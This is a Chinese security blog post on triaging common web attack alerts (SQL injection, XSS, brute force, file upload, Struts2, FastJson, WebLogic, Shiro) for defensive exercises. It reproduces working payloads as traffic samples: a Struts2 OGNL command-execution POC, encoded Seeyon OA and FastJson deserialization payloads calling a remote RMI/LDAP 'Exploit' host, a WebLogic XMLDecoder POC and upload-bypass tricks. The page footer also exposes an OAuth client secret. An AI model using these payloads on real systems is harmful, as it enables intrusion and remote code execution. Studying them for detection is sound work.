@@ -1,0 +1,473 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Web常见告警学习 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Web常见告警学习 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="web常见告警分析学习
+最近由于一些个人原因没有什么学习，摆烂了一段时间。这两天状态好点了，准备开始好好学习下了。刚好前段时间 george师傅 前段时间给我发了点hvv 应急告警的东西，（感觉不好好学习，都对不起这位师傅了。今天他又给我发..." />
+    <meta name="keywords" content="应急响应" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Web常见告警学习
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-03-11
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/XnfMUfAVO/" class="post-tag">
+                  # 应急响应
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h4 id="web常见告警分析学习">web常见告警分析学习</h4>
+<p>最近由于一些个人原因没有什么学习，摆烂了一段时间。这两天状态好点了，准备开始好好学习下了。刚好前段时间 george师傅 前段时间给我发了点hvv 应急告警的东西，（感觉不好好学习，都对不起这位师傅了。今天他又给我发了一些面试题。）也算是为了今年的 hvv 做点准备。</p>
+<p>文章基于timeline sec团队学习。</p>
+<h5 id="一般告警">一般告警</h5>
+<p>这里的一般告警指的就是常见的top10漏洞引发的告警信息，比如 sql xss 文件上传之类的。</p>
+<h6 id="sql注入告警">SQL注入告警</h6>
+<p>原理：把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL命令。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311143959209.png" alt="image-20230311143959209" loading="lazy"></figure>
+<p>从HTTP流量看SQL注入的payload</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144119539.png" alt="image-20230311144119539" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：判断设备告警信息中是否含有select，union，concat等sql语句的关键字，然后判断是否为正常 的业务语句，如果不是业务语句，则根据返回包判断是否成功注入，返回包无法判断的，可以自己将payload 复制下来，进行burp发包，根据发包的实际情况判断是否存在注入。</p>
+<p>需要注意的是有时候会遇到 hex url base64 之类的编码，这种情况下需要进行解码操作。</p>
+<h6 id="xss告警">XSS告警</h6>
+<p>原理：由于程序后端未做过滤，导致攻击者可以将恶意代码植入到正常的页面中。</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144432659.png" alt="image-20230311144432659" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144458399.png" alt="image-20230311144458399" loading="lazy"></figure>
+<p>流量特征：含有script，html标签等关键字。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144517440.png" alt="image-20230311144517440" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：判断设备告警信息中是否含有script，html标签等关键字，之后可到相应web页面去查看（注 意：不要登录系统账号）是否存在具体的payload。</p>
+<p>注：payload可能进行html，url等格式编码，有时需要进行解码。</p>
+<h6 id="暴力破解告警">暴力破解告警</h6>
+<p>原理：暴力破解漏洞的产生来自于服务器没有对输入参数次数进行限制。导致攻击者可以通过暴力的手段进 行破解所需要的信息。</p>
+<p>流量特征</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144625428.png" alt="image-20230311144625428" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144643999.png" alt="image-20230311144643999" loading="lazy"></figure>
+<p><strong>如何进行研判</strong>：</p>
+<pre><code> 1、状态码：100次30x，1次200，或者颠倒 
+
+ 2、状态码相同，看返回包内容，比如： Success：true，success：false；
+
+ 3、以上信息都判断完毕之后，使用暴破出的密码直接登录，看是否能登录成功。
+</code></pre>
+<h6 id="文件上传告警">文件上传告警</h6>
+<p>原理：后台对文件上传格式校验不严格中间件存在解析漏洞，导致文件上传可绕过。</p>
+<p>流量特征 看是否又恶意代码</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144752780.png" alt="image-20230311144752780" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311144804255.png" alt="image-20230311144804255" loading="lazy"></figure>
+<p><strong>文件上传常用的方法</strong>：</p>
+<pre><code>1、CMS本身存在文件上传漏洞 
+
+2、编辑器漏洞 Eweditor Fckeditor ueditor 
+
+3、中间件解析漏洞 IIS 5.x-6.0 xx.asp;.jpg /123.asp/ddd.jpg .aspx/.asa/.cer/.cdx IIS7/7.5 Fast-cgi开启 xx.jpg后面加/xx.php / xx.jpg/xx.php解析为 php 文件 Apache apache就会把sec.php.owf.rar解析成php 
+
+4、PUT方法开启直接上传 
+
+5、nginx %00 在文件名后添加一个%00字节，可以截断某些函数对文件名的判断
+
+//关于这个部分 往期我有一篇博客内容更加详细。是基于黑白名单的绕过写的。
+</code></pre>
+<h5 id="常见cms告警">常见CMS告警</h5>
+<p>一些cms具有nday 攻击者可以利用这些poc 和 exp 直接打。</p>
+<h6 id="discuz-告警">Discuz 告警</h6>
+<p>Discuz!ML V3.2-3.4代码执行漏洞</p>
+<p>原理：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。 检测方式： 在流量字段中检查language或者含有language的参数，是否含有php代码。</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311145441207.png" alt="image-20230311145441207" loading="lazy"></figure>
+<h6 id="致远oa文件上传实则代码执行">致远OA文件上传（实则代码执行）</h6>
+<pre><code>致远文件上传
+原理：对formulaManager参数校验不完整，导致Java代码被gzip ISO-8859-1与URL编码后可进行Java代码执行。
+检测方式：
+1、URL特征：
+/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip
+2、对arguments参数进行解码
+&quot;pocContent&quot;: 
+&quot;managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00%C2%8B%C2%AEVO%C3%8B%2F%
+C3%8A-
+%C3%8DI%0C%C2%A9%2CHU%C2%B7R0%C3%94Q%C2%80%C2%89%C3%B8%25%C3%A6%C2%82D%C3%94KR%C2%8BK%C
+3%94%11%C3%82%C2%AE%15%05E%C2%A9%C3%85%C3%85%C2%99%C3%B9y+%C3%89%C3%A0%C2%92%C2%A2%C3%8C%
+C2%BCt%C2%85%C2%82%C3%84%C2%92%0C%05%5B%05%25C%25%C3%ABZk%C2%90%06%0DM%C3%AB%C2%94%C3%94
+4%C2%85%C3%A2%C2%92%C3%84%C2%92%C3%8Cd%C2%85%C2%8A%C2%8A%0A%0D%C3%8Dj%C3%B5Z%C2%A0%29%40
+%C2%93%C2%AAAtIQi%C2%AAz%2C%00l%C3%BA%C2%92%C3%AC%C2%80%00%00%00&quot;
+3、检测工具：
+https://github.com/TimelineSec/ATTCK-Tools-library/tree/master/SeeyonEx
+</code></pre>
+<h5 id="struts2漏洞告警">Struts2漏洞告警</h5>
+<h6 id="struts2命令执行告警">Struts2命令执行告警</h6>
+<p>原理：OGNL表达式动态执行Java代码</p>
+<p>POC</p>
+<pre><code>%{
+#a=(new java.lang.ProcessBuilder(new
+java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),
+#b=#a.getInputStream(),
+#c=new java.io.InputStreamReader(#b),
+#d=new java.io.BufferedReader(#c),
+#e=new char[50000],
+#d.read(#e),
+#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),
+#f.getWriter().println(new java.lang.String(#e)),
+#f.getWriter().flush(),#f.getWriter().close()
+}
+</code></pre>
+<h5 id="fastjson漏洞告警">FastJson漏洞告警</h5>
+<h6 id="fastjson反序列化">fastJson反序列化</h6>
+<pre><code class="language-java">public class User {
+private int age;
+private String userName;
+public User() {
+System.out.println(&quot;User construct&quot;);
+}public String getUserName() {
+System.out.println(&quot;getUserName&quot;);
+return userName;
+}public void setUserName(String userName) {
+System.out.println(&quot;setUserName:&quot; + userName);
+this.userName = userName;
+}public int getAge() {
+System.out.println(&quot;getAge&quot;);
+return age;
+}public void setAge(int age) {
+System.out.println(&quot;setAge:&quot; + age);
+this.age = age;
+}
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+String jsonstr = &quot;{\&quot;@type\&quot;:\&quot;test_fastjson.User\&quot;, \&quot;age\&quot;:24,\&quot;userName\&quot;:\&quot;李四\&quot;}&quot;;
+try {
+JSON.parseObject(jsonstr);
+}catch (Exception e) {
+System.out.println(e.getMessage());
+}
+
+    
+    //输出结果
+User construct
+setAge:24
+setUserName:李四
+getAge
+getUserName
+</code></pre>
+<pre><code class="language-java">常见的反序列化链流量特征（ TemplatesImpl） ：
+{
+&quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+“_bytecodes” : 
+[“yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcA
+KQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUY
+WJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL
+3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXp
+lci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW
+4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwY
+WNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXB
+hY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAI
+PGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2
+YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZ
+wEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0a
+W9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsY
+W4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9
+vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQam
+F2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwE],
+&quot;_name&quot; : &quot;a&quot;,&quot;_tfactory&quot; : {}, &quot;outputProperties&quot; : {}}
+</code></pre>
+<pre><code class="language-java">常见的反序列化链流量特征（ JdbcRowSetImpl ） ：
+Rmi方式：
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://192.168.50.131:9999/
+Exploit&quot;,&quot;autoCommit&quot;:true}
+LDAP方式：
+{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.50.131:9999
+/Exploit&quot;,&quot;autoCommit&quot;:true}
+其余流量特征：1.2.25版本开始，进一步添加了配置项setAutoTypeSupport以及白名单
+{
+&quot;@type&quot;: &quot;java.lang.Class&quot;,
+&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+} 
+{&quot;a&quot;: {
+&quot;@type&quot;: &quot;java.lang.Class&quot;,
+&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+},&quot;b&quot;: {
+&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+&quot;dataSourceName&quot;: &quot;ldap://192.168.50.131:9999/Exploit&quot;,
+&quot;autoCommit&quot;: true
+}
+}
+</code></pre>
+<h5 id="weblogic反序列化">weblogic反序列化</h5>
+<h6 id="weblogic漏洞告警-xmldecoder类型反序列化">Weblogic漏洞告警-XMLDecoder类型反序列化</h6>
+<pre><code class="language-shell">因为XMLDecoder对SOAP形式的XML文件进行解析，对WorkContext标签内的所有标签进行解析，将java标签下的第一个职位class的object标签解析为需要加载的类，将最后一个class值为method的void标签解析为加载的类所要使用的方法，将array标签内class的值解析为方
+法的参数类型，length为参数的个数，中间的void+string类型的标签为方法执行的各个参数值。
+</code></pre>
+<p>POC</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150405115.png" alt="image-20230311150405115" loading="lazy"></figure>
+<pre><code class="language-xml">CVE-2019-2725 10.3.6POC：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;soapenv:Envelope
+xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;java&gt;
+&lt;array 
+method=&quot;forName&quot;&gt;&lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string
+&gt;
+&lt;void&gt;
+&lt;array class=&quot;byte&quot; length=反序列化数据字节的长度&gt; 
+&lt;void index=&quot;0&quot;&gt; &lt;byte&gt;-84&lt;/byte&gt; ... ... &lt;/array&gt;
+&lt;/void&gt;
+&lt;/class&gt; 
+&lt;/java&gt; 
+&lt;/work:WorkContext&gt;
+</code></pre>
+<p><strong>CVE-2019-2725 12.1.3 POC</strong></p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150518814.png" alt="image-20230311150518814" loading="lazy"></figure>
+<h6 id="weblogic漏洞告警-t3类型反序列化">Weblogic漏洞告警-T3类型反序列化</h6>
+<p>原理：因为T3数据传输结构的特殊性，导致了它可以进行反序列化利用</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150647696.png" alt="image-20230311150647696" loading="lazy"></figure>
+<p>流量特征：</p>
+<p>在TCP流量中（T3协议基于TCP协议），反序列化数据通常以ac ed 00 05开头，在T3中开头 特征都一样，结尾为：fe010000</p>
+<p>所以，拿到T3的流量包用wireshark打开跟踪TCP流：</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150829477.png" alt="image-20230311150829477" loading="lazy"></figure>
+<p>hex解码</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311150901561.png" alt="image-20230311150901561" loading="lazy"></figure>
+<h6 id="weblogic漏洞告警-iiop类型反序列化">Weblogic漏洞告警-IIOP类型反序列化</h6>
+<p>GIOP也是基于TCP，同样可以造成反序列化代码执行</p>
+<p>流量特征：</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20230311151010634.png" alt="image-20230311151010634" loading="lazy"></figure>
+<h5 id="shiro漏洞告警">Shiro漏洞告警</h5>
+<h6 id="shiro反序列化告警">Shiro反序列化告警</h6>
+<pre><code>Shiro550原理：
+Shiro组件会将前端的cookie中的RememberMe参数进行AES及Base64解密，然后将其反序
+列化。
+Shiro721原理：
+在Shiro550之后，Shiro要求提供正确的cookie以进行身份校验，而正确的cookie之后的恶意
+反序列化字段则会被Oracle Padding解密，导致反序列化代码执行
+流量特征：
+发送数据包中还有RememberMe字段且RememberMe字段含有大量的Base64编码，返回包
+中含有remeberMe=deleteMe。
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#web%E5%B8%B8%E8%A7%81%E5%91%8A%E8%AD%A6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0">web常见告警分析学习</a>
+<ul>
+<li><a href="#%E4%B8%80%E8%88%AC%E5%91%8A%E8%AD%A6">一般告警</a>
+<ul>
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%91%8A%E8%AD%A6">SQL注入告警</a></li>
+<li><a href="#xss%E5%91%8A%E8%AD%A6">XSS告警</a></li>
+<li><a href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%91%8A%E8%AD%A6">暴力破解告警</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%91%8A%E8%AD%A6">文件上传告警</a></li>
+</ul>
+</li>
+<li><a href="#%E5%B8%B8%E8%A7%81cms%E5%91%8A%E8%AD%A6">常见CMS告警</a>
+<ul>
+<li><a href="#discuz-%E5%91%8A%E8%AD%A6">Discuz 告警</a></li>
+<li><a href="#%E8%87%B4%E8%BF%9Coa%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%9E%E5%88%99%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">致远OA文件上传（实则代码执行）</a></li>
+</ul>
+</li>
+<li><a href="#struts2%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6">Struts2漏洞告警</a>
+<ul>
+<li><a href="#struts2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%91%8A%E8%AD%A6">Struts2命令执行告警</a></li>
+</ul>
+</li>
+<li><a href="#fastjson%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6">FastJson漏洞告警</a>
+<ul>
+<li><a href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">fastJson反序列化</a></li>
+</ul>
+</li>
+<li><a href="#weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">weblogic反序列化</a>
+<ul>
+<li><a href="#weblogic%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6-xmldecoder%E7%B1%BB%E5%9E%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Weblogic漏洞告警-XMLDecoder类型反序列化</a></li>
+<li><a href="#weblogic%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6-t3%E7%B1%BB%E5%9E%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Weblogic漏洞告警-T3类型反序列化</a></li>
+<li><a href="#weblogic%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6-iiop%E7%B1%BB%E5%9E%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Weblogic漏洞告警-IIOP类型反序列化</a></li>
+</ul>
+</li>
+<li><a href="#shiro%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6">Shiro漏洞告警</a>
+<ul>
+<li><a href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%8A%E8%AD%A6">Shiro反序列化告警</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/vulnhub-dc-6-ba-ji/">
+              <h3 class="post-title">
+                vulnhub DC-6 靶机
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
